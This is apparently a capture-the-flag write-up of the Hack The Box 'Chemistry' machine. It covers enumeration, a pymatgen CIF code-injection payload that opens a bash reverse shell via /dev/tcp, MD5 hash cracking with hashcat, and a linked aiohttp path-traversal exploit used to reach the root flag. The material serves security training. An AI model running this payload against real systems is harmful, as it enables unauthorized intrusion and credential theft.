
![Logo](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/Logo.png)



# Chemistry HTB

Objective: Hack the Linux machine, level: easy.


## Procedure
I know why you're here. You need advice because you're still figuring this stuff out. Trust me, I was there too. We all hit walls sometimes. For example, it took me two hours just to grab the root flag.

#### Enumeration

Alright, enumeration is key. Using nmap, we identify the services and other useful info.

```sh
 sudo nmap -sS -sVC -Pn -A --min-rate 5000 -n -p- -vvv 10.10.11.38 -oN nmap.txt
```

![nmap](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/nmap.png)

The output shows:

| Port             |  Service     |
| -----------------|--------------|
| 22               |SSH           |
|5000              |HTTP         |

Seems like a web issue. Probably need some directory enumeration tools... but nah, don’t need them today.

Let’s check out the web page.

![index](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/index.png)

It’s just a login and register page. Let’s register.

![Register](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/Register.png)

#### Ataquing

Oh, we can upload files. This is interesting. Maybe we can drop a reverse shell. Let’s upload a CIF file.

![Upload CIF file](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/Upload%20CIF%20file.png)

Let’s see what’s inside the example.CIF file.

![Link example](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/LinkExample.png)

![Example CIF](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/ExampleCIF.png)

Look for a CVE related to CIF.

![CVE CIF](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/CIF_CVE.png)

Here’s the POC.

![POC](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/vulnerabilityCIF.png)

Nice, now we can modify the example.cif to get a reverse shell.

```sh
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/IP/PORT 0>&1\'");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

```
Now listen with netcat:
```sh
nc -lvnp PORT
```
**Reminder:**  Don’t forget to change the ports and IP!

Now, upload the file and hit View.

![UploadAndView](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/uploadandViewCIF.png)

We’re in. Hold up... what’s this? A sqlite file? Haha, let’s grab it and see what’s inside.

![Looking app](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/appTesting.png)

** For convenience, spawn a bash shell with: **```python3 -c "import pty;pty.spawn('/bin/bash')" ```

Inside, we see user hashes. ChatGPT says the hash type is MD5, so let’s fire up hashcat.

![Looking hash](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/lookinghashrosainbrute.png)

Let’s attack the hash with hashcat.

```sh
sudo hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

![attacking the hash](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/hashattack.png)

#### Privilage escalation part 1

Nice, we’ve got the password for "rose." Let’s try logging in via SSH.

```sh
sudo -l
```

We can’t use sudo. That’s bad. Let’s check processes and the network.

```sh
ps aux

```

``` sh
netstat -l
```
```sh
ss -tuln
```
![netstat](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/netstat.png)

Port 8080 is running a local HTTP service. Let’s see which version.

```
curl http:127.0.0.1:8080 --head
```

![netstat](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/head.png)

Let’s check for vulnerabilities in aiohttp.

![CVE aiohtt](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/FIndingCVEaiohttp.png)

Boom, found a vulnerability. Let’s upload the exploit where Rose is and tweak it. This web app doesn’t have static files, just assets. Our target? root.txt.


![rootflag](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/rootflag.png)

We got it. Root flag’s ours.



## 🔗 Links

>* https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f
>* https://github.com/z3rObyte/CVE-2024-23334-PoC


